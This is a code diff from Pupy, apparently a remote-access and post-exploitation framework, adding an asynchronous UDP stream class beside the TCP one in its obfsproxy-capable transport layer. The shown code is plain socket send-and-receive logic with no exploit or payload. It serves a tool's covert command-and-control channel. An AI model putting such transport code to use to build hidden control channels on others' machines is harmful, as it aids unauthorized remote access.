@@ -3,7 +3,7 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 """ abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """
 
-__all__=["PupyAsyncTCPStream"]
+__all__=["PupyAsyncTCPStream", "PupyAsyncUDPStream"]
 
 from rpyc.core.stream import Stream
 from ..buffer import Buffer
@@ -175,6 +175,51 @@ class PupyAsyncTCPStream(PupyAsyncStream):
         s = None
         last_exc=None
         for res in socket.getaddrinfo(self.hostname, self.port, socket.AF_UNSPEC, socket.SOCK_STREAM):
+            af, socktype, proto, canonname, sa = res
+            try:
+                s = socket.socket(af, socktype, proto)
+            except socket.error as msg:
+                s = None
+                last_exc=msg
+                continue
+            try:
+                s.connect(sa)
+            except socket.error as msg:
+                s.close()
+                s = None
+                last_exc=msg
+                continue
+            break
+        if s is None:
+            raise last_exc
+        #print "sending %s"%repr(data)
+        s.sendall(data)
+        total_received=b""
+        #print "receiving ..."
+        s.settimeout(15)
+        while True:
+            try:
+                data = s.recv(4096)
+                if not data:
+                    break
+                total_received+=data
+            except socket.timeout:
+                break
+
+        #print "received: %s"%repr(total_received)
+        s.close()
+        return total_received
+
+class PupyAsyncUDPStream(PupyAsyncStream):
+    def __init__(self, dstconf, transport_class, transport_kwargs={}):
+        self.hostname=dstconf[0]
+        self.port=dstconf[1]
+        super(PupyAsyncUDPStream, self).__init__(dstconf, transport_class, transport_kwargs)
+
+    def pull_data(self, data):
+        s = None
+        last_exc=None
+        for res in socket.getaddrinfo(self.hostname, self.port, socket.AF_UNSPEC, socket.SOCK_DGRAM):
             af, socktype, proto, canonname, sa = res
             try:
                 s = socket.socket(af, socktype, proto)
